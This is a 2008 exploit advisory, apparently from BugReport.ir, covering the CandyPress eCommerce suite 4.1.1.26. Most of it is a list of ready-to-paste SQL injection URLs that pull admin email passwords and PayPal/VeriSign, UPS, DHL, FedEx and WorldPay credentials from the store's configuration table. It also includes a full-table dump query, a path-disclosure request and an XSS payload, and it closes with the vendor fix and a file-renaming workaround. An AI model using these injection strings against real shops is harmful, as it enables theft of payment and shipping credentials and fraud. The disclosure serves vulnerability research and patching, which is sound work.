@@ -1,0 +1,112 @@
+########################## WwW.BugReport.ir ###########################################
+#
+#      AmnPardaz Security Research & Penetration Testing Group
+#
+# Title: [CandyPress] eCommerce suite
+# Vendor: http://www.candypress.com/
+# Bugs: SQL Injection + XSS + Path Disclosure in CandyPress
+# Vulnerable Version: 4.1.1.26
+# Exploit: Available
+# Fix Available: Yes!, Update to 4.1.1.27 (http://www.candypress.com/CPforum/forum_posts.asp?TID=10630&PN=1) (There is a fast solution too)
+###################################################################################
+
+####################
+- Description:
+####################
+The CandyPress eCommerce suite acts as the command center of your online store. Powerful and versatile, yet easy to use and intuitive, it enables you to easily manage and administrate your orders, product catalog, shipping rates, locations, product reviews, customers and much more.
+
+####################
+- Vulnerability:
+####################
+Remote user can see all databases fields (there are a lot of encrypted credit cards), also there are XSS and Path Disclosure bugs too.
+
+POC:
+----
+Find Version:
+http://[CandyPressURL]/ajax/ajax_optInventory.asp?idProduct=-1%20or%201=1&options='%20union%20select%20configVal%20as%20inventory%20from%20storeAdmin%20where%20configVar='storeVersion'%20or%20'2'='1&action=get&inventory=1
+----
+Local Setup IP:
+http://[CandyPressURL]/ajax/ajax_optInventory.asp?idProduct=-1%20or%201=1&options='%20union%20select%20configVal%20as%20inventory%20from%20storeAdmin%20where%20configVar='excludeIP'%20or%20'2'='1&action=get&inventory=1
+----
+Admin Email:
+http://[CandyPressURL]/ajax/ajax_optInventory.asp?idProduct=-1%20or%201=1&options='%20union%20select%20configVal%20as%20inventory%20from%20storeAdmin%20where%20configVar='pEmailAdmin'%20or%20'2'='1&action=get&inventory=1
+Admin Email Password:
+http://[CandyPressURL]/ajax/ajax_optInventory.asp?idProduct=-1%20or%201=1&options='%20union%20select%20configVal%20as%20inventory%20from%20storeAdmin%20where%20configVar='pEmailAdminPassword'%20or%20'2'='1&action=get&inventory=1
+----
+Direct Username:
+http://[CandyPressURL]/ajax/ajax_optInventory.asp?idProduct=-1%20or%201=1&options='%20union%20select%20configVal%20as%20inventory%20from%20storeAdmin%20where%20configVar='ppDirectUserName'%20or%20'2'='1&action=get&inventory=1
+Direct Password:
+http://[CandyPressURL]/ajax/ajax_optInventory.asp?idProduct=-1%20or%201=1&options='%20union%20select%20configVal%20as%20inventory%20from%20storeAdmin%20where%20configVar='ppDirectPassword'%20or%20'2'='1&action=get&inventory=1
+Direct Signature:
+http://[CandyPressURL]/ajax/ajax_optInventory.asp?idProduct=-1%20or%201=1&options='%20union%20select%20configVal%20as%20inventory%20from%20storeAdmin%20where%20configVar='ppDirectSignature'%20or%20'2'='1&action=get&inventory=1
+----
+pp Password:
+http://[CandyPressURL]/ajax/ajax_optInventory.asp?idProduct=-1%20or%201=1&options='%20union%20select%20configVal%20as%20inventory%20from%20storeAdmin%20where%20configVar='ppPassword'%20or%20'2'='1&action=get&inventory=1
+ppUsername:
+http://[CandyPressURL]/ajax/ajax_optInventory.asp?idProduct=-1%20or%201=1&options='%20union%20select%20configVal%20as%20inventory%20from%20storeAdmin%20where%20configVar='ppUserName'%20or%20'2'='1&action=get&inventory=1
+ppSignature:
+http://[CandyPressURL]/ajax/ajax_optInventory.asp?idProduct=-1%20or%201=1&options='%20union%20select%20configVal%20as%20inventory%20from%20storeAdmin%20where%20configVar='ppSignature'%20or%20'2'='1&action=get&inventory=1
+----
+UPS UserID:
+http://[CandyPressURL]/ajax/ajax_optInventory.asp?idProduct=-1%20or%201=1&options='%20union%20select%20configVal%20as%20inventory%20from%20storeAdmin%20where%20configVar='UPSUserID'%20or%20'2'='1&action=get&inventory=1
+UPS Password:
+http://[CandyPressURL]/ajax/ajax_optInventory.asp?idProduct=-1%20or%201=1&options='%20union%20select%20configVal%20as%20inventory%20from%20storeAdmin%20where%20configVar='UPSPassword'%20or%20'2'='1&action=get&inventory=1
+UPS Access ID:
+http://[CandyPressURL]/ajax/ajax_optInventory.asp?idProduct=-1%20or%201=1&options='%20union%20select%20configVal%20as%20inventory%20from%20storeAdmin%20where%20configVar='UPSAccessID'%20or%20'2'='1&action=get&inventory=1
+----
+PayPal ... Login:
+http://[CandyPressURL]/ajax/ajax_optInventory.asp?idProduct=-1%20or%201=1&options='%20union%20select%20configVal%20as%20inventory%20from%20storeAdmin%20where%20configVar='VeriSignLogin'%20or%20'2'='1&action=get&inventory=1
+PayPal ... Partner:
+http://[CandyPressURL]/ajax/ajax_optInventory.asp?idProduct=-1%20or%201=1&options='%20union%20select%20configVal%20as%20inventory%20from%20storeAdmin%20where%20configVar='VeriSignPartner'%20or%20'2'='1&action=get&inventory=1
+PayPal ... Passowrd:
+http://[CandyPressURL]/ajax/ajax_optInventory.asp?idProduct=-1%20or%201=1&options='%20union%20select%20configVal%20as%20inventory%20from%20storeAdmin%20where%20configVar='VeriSignPassword'%20or%20'2'='1&action=get&inventory=1
+----
+WorldPay Call Back Password:
+http://[CandyPressURL]/ajax/ajax_optInventory.asp?idProduct=-1%20or%201=1&options='%20union%20select%20configVal%20as%20inventory%20from%20storeAdmin%20where%20configVar='WorldPayCallbackPW'%20or%20'2'='1&action=get&inventory=1
+WorldPay SID:
+http://[CandyPressURL]/ajax/ajax_optInventory.asp?idProduct=-1%20or%201=1&options='%20union%20select%20configVal%20as%20inventory%20from%20storeAdmin%20where%20configVar='WorldPayOutSID'%20or%20'2'='1&action=get&inventory=1
+----
+DHL Password:
+http://[CandyPressURL]/ajax/ajax_optInventory.asp?idProduct=-1%20or%201=1&options='%20union%20select%20configVal%20as%20inventory%20from%20storeAdmin%20where%20configVar='DHLPassword'%20or%20'2'='1&action=get&inventory=1
+DHL UserID:
+http://[CandyPressURL]/ajax/ajax_optInventory.asp?idProduct=-1%20or%201=1&options='%20union%20select%20configVal%20as%20inventory%20from%20storeAdmin%20where%20configVar='DHLUserID'%20or%20'2'='1&action=get&inventory=1
+----
+Fedex Password:
+http://[CandyPressURL]/ajax/ajax_optInventory.asp?idProduct=-1%20or%201=1&options='%20union%20select%20configVal%20as%20inventory%20from%20storeAdmin%20where%20configVar='FEDEXPassword'%20or%20'2'='1&action=get&inventory=1
+Fedex UserID:
+http://[CandyPressURL]/ajax/ajax_optInventory.asp?idProduct=-1%20or%201=1&options='%20union%20select%20configVal%20as%20inventory%20from%20storeAdmin%20where%20configVar='FEDEXUserID'%20or%20'2'='1&action=get&inventory=1
+----
+Admin Email Password:
+http://[CandyPressURL]/admin/utilities_ConfigHelp.asp?helpfield=-1')%20union%20select%20configVar%20as%20configHelp%20from%20storeAdmin%20where%20('1'='1
+http://[CandyPressURL]/admin/utilities_ConfigHelp.asp?helpfield=-1')%20union%20select%20configVal%20as%20configHelp%20from%20storeAdmin%20where%20configVar='pEmailAdmin'%20or%20('1'='2
+http://[CandyPressURL]/admin/utilities_ConfigHelp.asp?helpfield=-1')%20union%20select%20configVal%20as%20configHelp%20from%20storeAdmin%20where%20configVar='pEmailAdminPassword'%20or%20('1'='2
+http://[CandyPressURL]/admin/utilities_ConfigHelp.asp?helpfield=-1')%20union%20select%20configVar%20as%20configHelp%20from%20storeAdmin%20where%20('1'='1
+----
+Full data disclosure:
+http://[CandyPressURL]/ajax/ajax_getBrands.asp?recid=1%20or%201=1%20union%20select%20configVal,configVar%20from%20storeAdmin
+----
+Path Disclosure:
+http://[CandyPressURL]/admin/SA_shipFedExMeter.asp?FedExAccount=admin
+---
+XSS Bug:
+http://[CandyPressURL]/admin/utilities_ConfigHelp.asp?helpfield=%3Cscript%3Ealert('BugReport.IR from amnpardaz')%3C/script%3E
+
+####################
+- Fast Solution :
+####################
+1- Rename "/Admin" and "/Ajax" directories.
+2- Rename (or delete) dangerous files which are:
+	/ajax/ajax_optInventory.asp
+	/ajax/ajax_getBrands.asp
+	/admin/utilities_ConfigHelp.asp
+	/admin/SA_shipFedExMeter.asp
+	
+####################
+- Credit :
+####################
+AmnPardaz Security Research & Penetration Testing Group
+Contact: admin[4t}bugreport{d0t]ir
+WwW.BugReport.ir
+WwW.AmnPardaz.com
+
+# milw0rm.com [2008-01-25]
